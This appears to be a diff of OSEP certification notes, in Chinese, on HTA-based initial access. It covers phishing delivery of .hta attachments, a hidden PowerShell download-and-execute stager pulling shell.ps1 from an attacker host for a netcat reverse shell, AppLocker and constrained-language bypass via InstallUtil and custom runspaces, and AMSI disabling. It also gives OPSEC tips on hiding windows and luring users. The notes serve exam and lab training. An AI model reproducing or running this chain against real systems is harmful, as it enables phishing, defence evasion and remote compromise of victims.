@@ -1,27 +1,23 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 02 — HTA
+# 模块 M02：HTA 入口（邮件无 Office 宏时的第一阶段）
 
-mshta.exe as a signed host when Office is missing. Split download and execute if a combined stager dies.
+> 覆盖场景：6、7、8
+> > 前置依赖：攻击机上可被目标访问的 HTTP 服务（Kali `python3 -m http.server` 即可）；一个能编译 .NET Framework 的 Windows 环境（实验网任意 Win10 或自备 Windows VM，用于产出 `m02-clm-bypass-runspace.exe`）；邮件投递链路（swaks/sendEmail，见场景 6）。
 
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：6、7、8
-> > Prerequisites：attacker box上可被目标访问的 HTTP 服务（Kali `python3 -m http.server` 即可）；一个能编译 .NET Framework 的 Windows 环境（实验网任意 Win10 或自备 Windows VM，用于产出 `m02-clm-bypass-runspace.exe`）；邮件投递链路（swaks/sendEmail，见场景 6）。
-
-**本文档三个场景的关系**：场景 6 是"HTA 当第一阶段，目标有 AppLocker 无 Office"；场景 7 是"AppLocker + CLM + AMSI 全开"，需要把 HTA、InstallUtil 兼容程序集、自定义 Runspace、AMSI 处理、第二阶段 Runner **组合**起来Verify；场景 8 是"同一链路下载+执行合在一起不工作，拆开才工作"的**时序/生命周期排错**——不要一上来就怪杀软。三者共用同一套文件，差别在组合方式与排错顺序。
+**本文档三个场景的关系**：场景 6 是"HTA 当第一阶段，目标有 AppLocker 无 Office"；场景 7 是"AppLocker + CLM + AMSI 全开"，需要把 HTA、InstallUtil 兼容程序集、自定义 Runspace、AMSI 处理、第二阶段 Runner **组合**起来验证；场景 8 是"同一链路下载+执行合在一起不工作，拆开才工作"的**时序/生命周期排错**——不要一上来就怪杀软。三者共用同一套文件，差别在组合方式与排错顺序。
 
 ---
 
-## Scenario 6：邮件入口存在，但没有可用的 Office 宏入口
+## 场景 6：邮件入口存在，但没有可用的 Office 宏入口
 
-**Situation**：目标没有 Office（宏入口不可用），但会打开邮件里的链接或 .hta 文件；同时目标启用了 AppLocker，直接启动你上传的 EXE 会被拒绝。需要一条"不含独立 EXE 启动"的执行链。
+**场景回顾**：目标没有 Office（宏入口不可用），但会打开邮件里的链接或 .hta 文件；同时目标启用了 AppLocker，直接启动你上传的 EXE 会被拒绝。需要一条"不含独立 EXE 启动"的执行链。
 
-**Assumptions**：目标能收邮件并点击链接；用户会打开 HTA（浏览器打开 URL 形式，或双击附件形式）；AppLocker 是"默认规则"形态（放行 `%SystemRoot%\*` 下的签名程序，如 `mshta.exe`、`powershell.exe`、`csc.exe`、`InstallUtil.exe`），但**不允许我们上传的任意 EXE 直启**。我方已有：目标能访问的 `http://LHOST`（静态文件服务器）、监听端口 `LPORT`。
+**前提与假设**：目标能收邮件并点击链接；用户会打开 HTA（浏览器打开 URL 形式，或双击附件形式）；AppLocker 是"默认规则"形态（放行 `%SystemRoot%\*` 下的签名程序，如 `mshta.exe`、`powershell.exe`、`csc.exe`、`InstallUtil.exe`），但**不允许我们上传的任意 EXE 直启**。我方已有：目标能访问的 `http://LHOST`（静态文件服务器）、监听端口 `LPORT`。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. 搭静态服务器与监听：
    ```bash
    mkdir -p ~/osep/payloads/web && cd ~/osep/payloads/web
@@ -45,8 +41,8 @@ Switch to **中文** in the header for the original full narrative. Lab listings
      -u "Subject: issue" -m "see attached" -a ~/osep/payloads/web/stager.hta
    ```
 
-**Procedure**：
-1. 先Verify"HTA 能触发、JScript 能跑"：把 `ok.hta` 发给目标（或直接在已控的同类环境点开 `http://LHOST/ok.hta`）。它只做一次无害 HTTP 回调（`/cb?u=<用户名>@<主机名>`），不会落地任何 payload。**看到服务器日志里有 `/ok.hta` 与 `/cb` 两个请求即证明 mshta→JScript→ActiveX 全通**。
+**执行步骤**：
+1. 先验证"HTA 能触发、JScript 能跑"：把 `ok.hta` 发给目标（或直接在已控的同类环境点开 `http://LHOST/ok.hta`）。它只做一次无害 HTTP 回调（`/cb?u=<用户名>@<主机名>`），不会落地任何 payload。**看到服务器日志里有 `/ok.hta` 与 `/cb` 两个请求即证明 mshta→JScript→ActiveX 全通**。
 2. 无 CLM（可用 `powershell -ep bypass` 确认，见步骤 3 判断）时用 `stager.hta`：mshta 执行其中 JScript，`WScript.Shell.Run` 启动 `powershell.exe -nop -w hidden -Command "IEX(DownloadString 'http://LHOST/shell.ps1')"`。观察：
    - web 日志出现 `GET /stager.hta`、`GET /shell.ps1`；
    - `nc` 监听出现回连。
@@ -54,13 +50,13 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 4. 若只是"EXE 被 AppLocker 拦、PowerShell 可用"（无 CLM）：仍可用 HTA + PowerShell 下载落地后经 `InstallUtil.exe /U` 加载（InstallUtil 在 `%SystemRoot%` 下，默认规则放行），runner 见 `m02-clm-bypass-runspace.cs`。
 5. 位数核对表（HTA 由 mshta.exe 承载，随系统位数）：x64 系统用 `C:\Windows\System32\mshta.exe`（64 位）会拉 64 位 powershell；需要 x86 载荷时改走 `C:\Windows\SysWOW64\mshta.exe`，或在脚本里显式调用 `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m02-hta-callback.hta` | 最小 HTA，确认 mshta/JScript/出网 | 替换 `LHOST` |
 | `m02-hta-powershell-stager.hta` | HTA→PowerShell IEX 拉 `shell.ps1` | 替换 `LHOST` |
 | `m02-clm-bypass-runspace.cs` | InstallUtil 兼容 runner（x86/x64 各编一份） | 替换 `LHOST` 后编译 |
-| `m02-hta-embedded-clm-bypass.hta` | 单文件兜底：内嵌 C#，target现编现跑 | 替换 `LHOST` |
+| `m02-hta-embedded-clm-bypass.hta` | 单文件兜底：内嵌 C#，目标机现编现跑 | 替换 `LHOST` |
 
 #### `m02-hta-callback.hta` {#m02-hta-callback-hta}
 
@@ -377,25 +373,25 @@ namespace M02
 </html>
 ````
 
-**Verify**：web 日志顺序出现 `GET /xxx.hta` → `GET /shell.ps1`（或 `/cb`），随后 `nc -lvnp LPORT` 拿到回连；`whoami` 输出为目标用户。任何一环缺失，按场景 8 的"逐环节回显"定位。
+**验证**：web 日志顺序出现 `GET /xxx.hta` → `GET /shell.ps1`（或 `/cb`），随后 `nc -lvnp LPORT` 拿到回连；`whoami` 输出为目标用户。任何一环缺失，按场景 8 的"逐环节回显"定位。
 
-**If it fails**：
+**失败分支与备选**：
 - 如果 `mshta.exe` 被 AppLocker 拒（策略连 System32 都收紧）→ 改走 `cscript/wscript` 的 JScript 路线（见 M03 场景 9-10），或换一个默认放行的签名宿主。
 - 如果 `.hta` 附件被邮件网关过滤 → 只发链接，HTA 放 web 根；或把链接写成 `C:\Windows\System32\mshta.exe http://LHOST/stager.hta` 形式的快捷方式再诱导。
 - 如果 `DownloadString` 被拦（AMSI/Defender 对 IEX 内容扫描）→ 先跑 `Disable AMSI`（cheat sheet 同名单节）再 IEX，或直接切场景 7 的组合链。
 - 如果出网只有代理 → shell.ps1 里改用 `[System.Net.WebRequest]::DefaultWebProxy` 显式挂代理（详见 M09 场景 28）。
 
-**Exam notes / OPSEC**：HTA 会在桌面闪现一个窗口——用 `<HTA:APPLICATION ... WINDOWSTATE="minimize">` 且脚本末尾 `self.close()`，不要让窗口停在用户眼前；邮件正文不要出现真实attacker box域名，用诱惑性业务话术；先跑无害回调、后跑 payload，避免"假入口"上浪费一整个邮件回合。
+**考试注意 / OPSEC**：HTA 会在桌面闪现一个窗口——用 `<HTA:APPLICATION ... WINDOWSTATE="minimize">` 且脚本末尾 `self.close()`，不要让窗口停在用户眼前；邮件正文不要出现真实攻击机域名，用诱惑性业务话术；先跑无害回调、后跑 payload，避免"假入口"上浪费一整个邮件回合。
 
 ---
 
-## Scenario 7：HTA 可以触发，但目标同时有 AppLocker、CLM 和 AMSI
+## 场景 7：HTA 可以触发，但目标同时有 AppLocker、CLM 和 AMSI
 
-**Situation**：HTA 能执行，但普通 EXE 被应用控制限制；PowerShell 处于受限语言模式（CLM：`Add-Type`、反射、动态编译不可用）；脚本内容还被 AMSI 扫描。**单一组件Verify通过 ≠ 链路能通**，必须完整组合Verify。
+**场景回顾**：HTA 能执行，但普通 EXE 被应用控制限制；PowerShell 处于受限语言模式（CLM：`Add-Type`、反射、动态编译不可用）；脚本内容还被 AMSI 扫描。**单一组件验证通过 ≠ 链路能通**，必须完整组合验证。
 
-**Assumptions**：AppLocker 默认规则放行 System32 下签名程序：`mshta.exe`、`powershell.exe`（但进 CLM）、`csc.exe`、`InstallUtil.exe`；脚本文件（.ps1）被脚本规则/语言模式限制，不能直接 `powershell -File`。自定义 Runspace 是关键：由非 powershell.exe 进程（InstallUtil 承载的 .NET 程序）创建 `System.Management.Automation.Runspaces`，该引擎在 FullLanguage 下运行，且不受 AppLocker 脚本规则约束。
+**前提与假设**：AppLocker 默认规则放行 System32 下签名程序：`mshta.exe`、`powershell.exe`（但进 CLM）、`csc.exe`、`InstallUtil.exe`；脚本文件（.ps1）被脚本规则/语言模式限制，不能直接 `powershell -File`。自定义 Runspace 是关键：由非 powershell.exe 进程（InstallUtil 承载的 .NET 程序）创建 `System.Management.Automation.Runspaces`，该引擎在 FullLanguage 下运行，且不受 AppLocker 脚本规则约束。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. `shell.ps1` 改进版：在 cheat sheet 回连模板（`C# for CLM Bypass with PS Script` 一节）**首行插入 AMSI 处理**（FullLanguage 下 `amsiInitFailed` 反射法有效），再放回连代码；替换 `LHOST/LPORT`。Host 到 web 根。
 2. 在 Windows 编译机上产出 runner（x64 与 x86 各一）：
    ```bat
@@ -414,10 +410,10 @@ namespace M02
 3. 可选：对 exe 做 `certutil -encode m02stage64.exe enc.txt`，让 runner 能以文本形式过邮件/下载链（目标侧再 `certutil -decode`，见 cheat sheet 步骤）。
 4. 把 exe/enc.txt、shell.ps1 全部放到 Kali web 根；启动 `python3 -m http.server` 与 `nc -lvnp LPORT`。
 
-**Procedure**：
+**执行步骤**：
 1. 侦察确认三件事都在（用 `m00-recon-defenses.ps1`）：AppLocker 有效规则、语言模式 `ConstrainedLanguage`、`amsi.dll` 是否进进程（cheat sheet `Enumerate Defenses`/`Disable AMSI`）。三者齐备才值得上本链路。
 2. 先跑 `m02-hta-callback.hta` 确认 mshta 宿主本身没被策略/杀软按进程名拦（回调 `GET /cb` 出现即可）。
-3. 用 `m02-hta-embedded-clm-bypass.hta`（单文件、内嵌 C# 源码 + target csc 现编译 + InstallUtil /U 触发）或手工执行等价的"下载→解码→InstallUtil"链：
+3. 用 `m02-hta-embedded-clm-bypass.hta`（单文件、内嵌 C# 源码 + 目标机 csc 现编译 + InstallUtil /U 触发）或手工执行等价的"下载→解码→InstallUtil"链：
    ```
    mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta
    ```
@@ -433,7 +429,7 @@ namespace M02
    - AMSI：AMSI 挂进 System.Management.Automation 引擎（无论谁创建），所以在**同一个自定义 Runspace 里先跑 `amsiInitFailed` 反射**再 IEX 下载内容。
 5. 备选执行形态（同一 runner 换触发方式）：`InstallUtil.exe /logfile= /LogToConsole=false /U` 也可以从 PowerShell（哪怕 CLM 里只能跑已允许命令）或已上线会话里调用；runner 不必非经 mshta。若 InstallUtil 被策略点名拒绝 → 用 DotNetToJScript 变体：把 `m02-clm-bypass-dotnettojscript.cs` 编成 library，经 DotNetToJScript 工具序列化成 .js 塞进 HTA（JScript 载荷加载见 M03），完全不经 EXE 与 InstallUtil。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m02-hta-embedded-clm-bypass.hta` | 单文件完整链：mshta→csc→InstallUtil→Runspace→IEX | 替换 `LHOST` |
@@ -582,27 +578,27 @@ namespace Payload
 </html>
 ````
 
-**Verify**：链路分 4~5 个 HTTP 回显点（`hta-start` / `cs-written` / `compile-ok` / `installutil-called` / 最终 nc 回连）。考试时按回显停在哪个点来定位：停在编译前=写文件或 csc 被拦；停在 InstallUtil 后无回连=runner 位数不对或 shell.ps1 被 AMSI/杀软拦。最后 `whoami` + `ipconfig /all` 确认身份与网段。
+**验证**：链路分 4~5 个 HTTP 回显点（`hta-start` / `cs-written` / `compile-ok` / `installutil-called` / 最终 nc 回连）。考试时按回显停在哪个点来定位：停在编译前=写文件或 csc 被拦；停在 InstallUtil 后无回连=runner 位数不对或 shell.ps1 被 AMSI/杀软拦。最后 `whoami` + `ipconfig /all` 确认身份与网段。
 
-**If it fails**：
+**失败分支与备选**：
 - 若 x64 runner 无回连而 x86 有（或反之）→ 位数不匹配，换另一份编译产物；确认 mshta/InstallUtil 实际位数（Framework64 是 64 位程序）。
 - 若 InstallUtil 本身被 AppLocker 或策略移除 → DotNetToJScript 变体（不经 InstallUtil、不经 EXE）。
 - 若 AMSI 处理那行被拦（`AmsiUtils` 字符串本身是特征）→ 换 `Disable AMSI` 一节的其他反射写法或拆串拼接，并保持与宿主进程位数一致。
-- 若整条链在真实目标上"分开的环节各自单独Verify都过、串起来没反应" → 按场景 8 排时序，不预设是杀软。
+- 若整条链在真实目标上"分开的环节各自单独验证都过、串起来没反应" → 按场景 8 排时序，不预设是杀软。
 
-**Exam notes / OPSEC**：三件套组合链**必须在实验网完整走一遍**再上考场——顺序、位数、引用缺失、InstallUtil 路径任何一个没验过都是时间黑洞；runner 与 shell.ps1 用 x64/x86 双份并按目标实测；避免 Meterpreter 大载荷，简单 TCP 回连 + AMSI 处理最稳（cheat sheet 注明 AMSI 开启时部分样本不工作）；HTA 会短暂闪窗，用 minimize + 立即 `self.close()`。
+**考试注意 / OPSEC**：三件套组合链**必须在实验网完整走一遍**再上考场——顺序、位数、引用缺失、InstallUtil 路径任何一个没验过都是时间黑洞；runner 与 shell.ps1 用 x64/x86 双份并按目标实测；避免 Meterpreter 大载荷，简单 TCP 回连 + AMSI 处理最稳（cheat sheet 注明 AMSI 开启时部分样本不工作）；HTA 会短暂闪窗，用 minimize + 立即 `self.close()`。
 
 ---
 
-## Scenario 8：HTA 下载和执行放在一起失败，分开后能够工作
+## 场景 8：HTA 下载和执行放在一起失败，分开后能够工作
 
-**Situation**：目标确实打开了 HTA、也访问了下载地址，但最终没有执行结果——"分开可以、放一起没反应"。按**时序与生命周期**场景处理，不预先认定失败由杀软造成。
+**场景回顾**：目标确实打开了 HTA、也访问了下载地址，但最终没有执行结果——"分开可以、放一起没反应"。按**时序与生命周期**场景处理，不预先认定失败由杀软造成。
 
-**Assumptions**：HTA 能触发（场景 6/7 的回调已Verify）；下载地址确实被访问过（web 日志有 GET）；"合在一起的单条命令"里同时含下载与执行两件事。可能成因分类：A) 单条命令行里的引号/转义在 cmd 层被吃掉（最常见：外层 `Run("...")` 双引号 + 内层 PowerShell 引号 + `&` `|` `;` 在 HTML 属性里被当实体解析）；B) 第一个进程写文件未落盘/未写完，第二个进程已开始读；C) mshta 主窗口 `self.close()` 提前退出，宿主对子进程的生命周期管理（job/window station）把长任务带走；D) 命令过长或整体文本触发 AMSI/杀软静态扫描，而拆短后不触发；E) 新写文件正被实时扫描，紧跟着的进程打不开（时间竞争）。
+**前提与假设**：HTA 能触发（场景 6/7 的回调已验证）；下载地址确实被访问过（web 日志有 GET）；"合在一起的单条命令"里同时含下载与执行两件事。可能成因分类：A) 单条命令行里的引号/转义在 cmd 层被吃掉（最常见：外层 `Run("...")` 双引号 + 内层 PowerShell 引号 + `&` `|` `;` 在 HTML 属性里被当实体解析）；B) 第一个进程写文件未落盘/未写完，第二个进程已开始读；C) mshta 主窗口 `self.close()` 提前退出，宿主对子进程的生命周期管理（job/window station）把长任务带走；D) 命令过长或整体文本触发 AMSI/杀软静态扫描，而拆短后不触发；E) 新写文件正被实时扫描，紧跟着的进程打不开（时间竞争）。
 
-**Prepare (attacker)**：静态服务器上放 3 个文件：`m02-hta-download-exec-split.hta`、下载源（`shell.ps1` 或 `stage2.ps1`）、`ok.txt` 探针。监听 `nc -lvnp LPORT`。**另外开一个终端持续 `tail -f` web 访问日志**——本场景的所有结论都来自日志顺序，不是猜。
+**准备（攻击机侧）**：静态服务器上放 3 个文件：`m02-hta-download-exec-split.hta`、下载源（`shell.ps1` 或 `stage2.ps1`）、`ok.txt` 探针。监听 `nc -lvnp LPORT`。**另外开一个终端持续 `tail -f` web 访问日志**——本场景的所有结论都来自日志顺序，不是猜。
 
-**Procedure**：
+**执行步骤**：
 1. 先收集证据，回答四个问题（web 日志逐条核对）：
    1. `GET /xxx.hta` 有吗？没有 → 是投递/触发问题，不是执行链问题；
    2. HTA 首行回显（`/cb?stage=hta-start`）有吗？没有 → mshta 里 JScript 没跑起来；
@@ -616,32 +612,32 @@ namespace Payload
    - 阶段一回显失败 → 下载命令本身的引号/代理问题（回到场景 6 备选：换 `certutil`/`bitsadmin` 下载，或给 PowerShell 显式代理）；
    - 阶段一成功、阶段二失败 → 执行方式被限制（CLM/AppLocker/杀软执行路径），把执行端换成场景 7 的 runner 触发（InstallUtil /U 或自定义 Runspace IEX）；
    - 两阶段单独都成功，但合成一条命令就失败 → 就是 A 类转义/解析问题或 C 类生命周期：**不再尝试单行**，坚持两阶段；若必须单文件，把两个 `Run` 用 `&&`/`;` 放在**同一条 cmd 串**里并给每条加 `start /wait` 语义，同时避免任何引号嵌套（把 PowerShell 代码先 `-enc` base64，命令里只剩一层引号）。
-4. "带完成确认的单文件版本"（题目要求可提前准备）：同一 .hta 内按顺序放两个 `Run(..., 0, true)`，不要依赖 `self.close()` 后子进程继续存活；关键操作前回显进度点。Verify时对照 web 日志确认回显顺序 = 代码顺序。
+4. "带完成确认的单文件版本"（题目要求可提前准备）：同一 .hta 内按顺序放两个 `Run(..., 0, true)`，不要依赖 `self.close()` 后子进程继续存活；关键操作前回显进度点。验证时对照 web 日志确认回显顺序 = 代码顺序。
 5. 只有当"日志显示每个环节都成功、分离状态也成功、仅合并不行"时，才把杀软/AMSI 列为候选，并按场景 7 的 AMSI 处理与更短命令重试。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m02-hta-download-exec-split.hta` | 下载与执行分离两阶段 + 文件存在性检查 + 进度回显 | 替换 `LHOST`、`OUT` |
 | `m02-hta-callback.hta` | 确认 HTA 触发与出网（排错第一步） | 替换 `LHOST` |
 | `m02-hta-powershell-stager.hta` | 对照用：一步式 IEX（演示"合在一起"形态） | 替换 `LHOST` |
 
-**Verify**：web 日志出现有序回显 `hta-start → download-done → exec-done`，`nc` 拿到回连。把"失败形态"与"分离形态"的日志并排对比，能直接指认断点环节；能稳定复现分离成功 = 问题定位完成。
+**验证**：web 日志出现有序回显 `hta-start → download-done → exec-done`，`nc` 拿到回连。把"失败形态"与"分离形态"的日志并排对比，能直接指认断点环节；能稳定复现分离成功 = 问题定位完成。
 
-**If it fails**：
+**失败分支与备选**：
 - 若下载走 PowerShell 被拦但浏览器/mshta 出网正常 → 下载器换成 `certutil -urlcache -split -f URL OUT` 或 `bitsadmin /transfer`（M10 的下载备选矩阵通用）。
 - 若执行端是 CLM 导致 `-File shell.ps1` 无效 → 执行端换 InstallUtil/自定义 Runspace（场景 7 链路），下载端保持分离。
 - 若怀疑扫描时间竞争 → 两阶段之间加固定 `WScript.Sleep(2000~5000)` 或轮询文件可读后再执行。
-- 若target mshta 一 `self.close()` 子进程就被带走 → 让执行命令通过 `schtasks` 或 `wmic process call create` 脱离宿主进程树（生命周期解法，注意是否落在 AppLocker 白名单内）。
+- 若目标机 mshta 一 `self.close()` 子进程就被带走 → 让执行命令通过 `schtasks` 或 `wmic process call create` 脱离宿主进程树（生命周期解法，注意是否落在 AppLocker 白名单内）。
 
-**Exam notes / OPSEC**：本场景最大坑是"没看日志就换杀软绕过"，白白浪费时间——**先回显、再下结论**；分离两阶段的回显点本身就是考试里可展示的排错证据；单文件合成版若必须给用户，确保窗口 minimize + 立即关闭，避免"下载完窗口还挂着"被用户注意到；对目标写文件优先 `C:\Windows\Tasks` 或 `%TEMP%`，避免触发受保护目录写入告警。
+**考试注意 / OPSEC**：本场景最大坑是"没看日志就换杀软绕过"，白白浪费时间——**先回显、再下结论**；分离两阶段的回显点本身就是考试里可展示的排错证据；单文件合成版若必须给用户，确保窗口 minimize + 立即关闭，避免"下载完窗口还挂着"被用户注意到；对目标写文件优先 `C:\Windows\Tasks` 或 `%TEMP%`，避免触发受保护目录写入告警。
 
 ---
 
 ## 模块速查表
 
 ```bash
-# ---- attacker box侧 ----
+# ---- 攻击机侧 ----
 cd ~/osep/payloads/web && python3 -m http.server 80
 nc -lvnp LPORT
 # 邮件诱导（链接形式优先）：
